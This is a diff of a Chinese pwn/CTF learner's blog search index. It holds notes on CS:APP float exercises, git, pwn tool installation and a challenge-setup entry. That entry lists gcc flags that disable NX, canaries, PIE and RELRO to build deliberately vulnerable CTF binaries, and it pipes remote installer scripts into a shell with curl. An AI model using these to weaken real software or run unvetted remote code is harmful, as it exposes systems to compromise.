+<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
+<p>NaN</p>
+<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
+<p>正负无穷</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
+<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
+<p>情况：</p>
+<ul>
+<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
+</li>
+<li><p>如果大于31，大了，直接返回0x80000000u</p>
+</li>
+<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
+<ul>
+<li>E &lt; 23，说明后面还有小数部分</li>
+<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
+</ul>
+<p>最后，根据符号位，返回对应符号的frac</p>
+</li>
+</ul>
+<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
+<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
+<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
+<p>E = x;</p>
+<p>0 | bios + E | 23个0</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
+<hr>
+<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
+]]></content>
+      <tags>
+        <tag>csapp</tag>
       </tags>
   </entry>
   <entry>
@@ -884,56 +904,6 @@
       </categories>
       <tags>
         <tag>pwnable.tw</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git</title>
-    <url>/2021/01/30/git/</url>
-    <content><![CDATA[<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>开源的分布式<strong>版本控制</strong>系统</p>
-<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
-<li>是分布式的</li>
-<li>内容按原数据方式存储</li>
-<li>没有全局的版本号</li>
-<li>内容的完整性（内容存储使用的是 SHA-1 哈希算法）</li>
-</ol>
-<p><img src="/2021/01/30/git/image-20210130111523672.png" alt="image-20210130111523672"></p>
-<h2 id="git-常用命令"><a href="#git-常用命令" class="headerlink" title="git 常用命令"></a>git 常用命令</h2><p><img src="/2021/01/30/git/gitcommands.jpg" alt="gitcommands"></p>
-]]></content>
-      <categories>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn出题环境搭建</title>
-    <url>/2020/11/07/pwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<blockquote>
-<p>周六有个校赛，要出题目和搭建环境，记录下一些有用的东西</p>
-</blockquote>
-<p>GCC编译中几种保护打开和关闭的参数：<a href="https://blog.csdn.net/lonyliu/article/details/90341012" target="_blank" rel="noopener">https://blog.csdn.net/lonyliu/article/details/90341012</a></p>
-<ul>
-<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li>
-<li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启) 栈里插入cookie信息</li>
-<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></li>
-<li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
-</ul>
-<p><code>gcc 文件名.c -o 文件 -z execstack -fno-stack-protector -no-pie -z norelro</code></p>
-<p>如何安全快速地部署多道 ctf pwn 比赛题目：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
-<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line">或者</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>大一大二想要实习的同学</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>出题环境</tag>
       </tags>
   </entry>
   <entry>
@@ -1367,6 +1337,72 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </tags>
   </entry>
   <entry>
+    <title>pwn出题环境搭建</title>
+    <url>/2020/11/07/pwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<blockquote>
+<p>周六有个校赛，要出题目和搭建环境，记录下一些有用的东西</p>
+</blockquote>
+<p>GCC编译中几种保护打开和关闭的参数：<a href="https://blog.csdn.net/lonyliu/article/details/90341012" target="_blank" rel="noopener">https://blog.csdn.net/lonyliu/article/details/90341012</a></p>
+<ul>
+<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li>
+<li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启) 栈里插入cookie信息</li>
+<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></li>
+<li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
+</ul>
+<p><code>gcc 文件名.c -o 文件 -z execstack -fno-stack-protector -no-pie -z norelro</code></p>
+<p>如何安全快速地部署多道 ctf pwn 比赛题目：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
+<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line">或者</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>大一大二想要实习的同学</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>出题环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn题环境</title>
+    <url>/2021/02/18/pwn%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<blockquote>
+<p>呃，，，总是弄炸环境，，，，还忘记快照，，，，</p>
+</blockquote>
+<h2 id="1-pwngdb"><a href="#1-pwngdb" class="headerlink" title="1.pwngdb"></a>1.pwngdb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-pip"><a href="#2-pip" class="headerlink" title="2.pip"></a>2.pip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-pwntools"><a href="#3-pwntools" class="headerlink" title="3.pwntools"></a>3.pwntools</h2><p><a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">pwntools安装使用方法</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果有vpn的话无所谓，否则最好用清华源，，，</p>
+</blockquote>
+<h2 id="4-LibcSearcher"><a href="#4-LibcSearcher" class="headerlink" title="4.LibcSearcher"></a>4.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-sublime"><a href="#5-sublime" class="headerlink" title="5.sublime"></a>5.sublime</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team&#x2F;sublime-text-3</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install sublime-text-installer</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>winter</title>
+    <url>/2020/07/23/winter/</url>
+    <content><![CDATA[<p>who am i</p>
+<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>v8环境搭建</title>
     <url>/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
@@ -1451,40 +1487,23 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </tags>
   </entry>
   <entry>
-    <title>pwn题环境</title>
-    <url>/2021/02/18/pwn%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<blockquote>
-<p>呃，，，总是弄炸环境，，，，还忘记快照，，，，</p>
-</blockquote>
-<h2 id="1-pwngdb"><a href="#1-pwngdb" class="headerlink" title="1.pwngdb"></a>1.pwngdb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
+    <title>一些陌生函数详解</title>
+    <url>/2021/01/14/%C2%96%E4%B8%80%E4%BA%9B%E9%99%8C%E7%94%9F%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="read-chk"><a href="#read-chk" class="headerlink" title="__read_chk"></a>__read_chk</h1><h2 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h2><p>__read_chk-从文件描述符读取，并进行缓冲区溢出检查</p>
+<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t __read_chk(int *fd*, void * *buf*, size_t *nbytes*, size_t *buflen*);</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-pip"><a href="#2-pip" class="headerlink" title="2.pip"></a>2.pip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-pwntools"><a href="#3-pwntools" class="headerlink" title="3.pwntools"></a>3.pwntools</h2><p><a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">pwntools安装使用方法</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如果有vpn的话无所谓，否则最好用清华源，，，</p>
-</blockquote>
-<h2 id="4-LibcSearcher"><a href="#4-LibcSearcher" class="headerlink" title="4.LibcSearcher"></a>4.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-sublime"><a href="#5-sublime" class="headerlink" title="5.sublime"></a>5.sublime</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team&#x2F;sublime-text-3</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install sublime-text-installer</span><br></pre></td></tr></table></figure>
-
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>接口<code>__read_chk（）的</code>功能应与接口<code>read（）相同</code>，只是 <code>__read_chk（）</code>在计算结果之前应检查缓冲区溢出。如果预计会发生溢出，则该函数应中止并且调用它的程序应退出。</p>
+<p>参数<code>*buflen*</code>指定缓冲区<code>*buf*</code>的大小 。如果<code>*nbytes*</code>超过 <code>*buflen*</code>，该函数将中止，并且调用它的程序将退出。</p>
+<p>所述<code>__read_chk（）</code>函数不在源标准; 它仅在二进制标准中。</p>
+<p><a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/" target="_blank" rel="noopener">Linux标准基础核心规范4.1</a></p>
+<hr>
 ]]></content>
       <categories>
-        <category>pwn</category>
+        <category>基础知识</category>
       </categories>
       <tags>
-        <tag>基础知识</tag>
+        <tag>陌生函数</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>winter</title>
-    <url>/2020/07/23/winter/</url>
-    <content><![CDATA[<p>who am i</p>
-<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
-]]></content>
   </entry>
   <entry>
     <title>ctf-wiki的刷题笔记</title>
@@ -1925,25 +1944,6 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </tags>
   </entry>
   <entry>
-    <title>一些陌生函数详解</title>
-    <url>/2021/01/14/%C2%96%E4%B8%80%E4%BA%9B%E9%99%8C%E7%94%9F%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="read-chk"><a href="#read-chk" class="headerlink" title="__read_chk"></a>__read_chk</h1><h2 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h2><p>__read_chk-从文件描述符读取，并进行缓冲区溢出检查</p>
-<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t __read_chk(int *fd*, void * *buf*, size_t *nbytes*, size_t *buflen*);</span><br></pre></td></tr></table></figure>
-
-<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>接口<code>__read_chk（）的</code>功能应与接口<code>read（）相同</code>，只是 <code>__read_chk（）</code>在计算结果之前应检查缓冲区溢出。如果预计会发生溢出，则该函数应中止并且调用它的程序应退出。</p>
-<p>参数<code>*buflen*</code>指定缓冲区<code>*buf*</code>的大小 。如果<code>*nbytes*</code>超过 <code>*buflen*</code>，该函数将中止，并且调用它的程序将退出。</p>
-<p>所述<code>__read_chk（）</code>函数不在源标准; 它仅在二进制标准中。</p>
-<p><a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/" target="_blank" rel="noopener">Linux标准基础核心规范4.1</a></p>
-<hr>
-]]></content>
-      <categories>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>陌生函数</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>固件iot基础</title>
     <url>/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
@@ -2092,6 +2092,17 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
 ]]></content>
   </entry>
   <entry>
+    <title>祥云杯 2020</title>
+    <url>/2020/12/24/%E7%A5%A5%E4%BA%91%E6%9D%AF-2020/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>祥云杯 2020</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>编译debug版本的glibc</title>
     <url>/2021/02/18/%E7%BC%96%E8%AF%91debug%E7%89%88%E6%9C%AC%E7%9A%84glibc/</url>
     <content><![CDATA[<h2 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h2><ol>
@@ -2121,17 +2132,6 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </categories>
       <tags>
         <tag>基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>祥云杯 2020</title>
-    <url>/2020/12/24/%E7%A5%A5%E4%BA%91%E6%9D%AF-2020/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>祥云杯 2020</tag>
       </tags>
   </entry>
 </search>
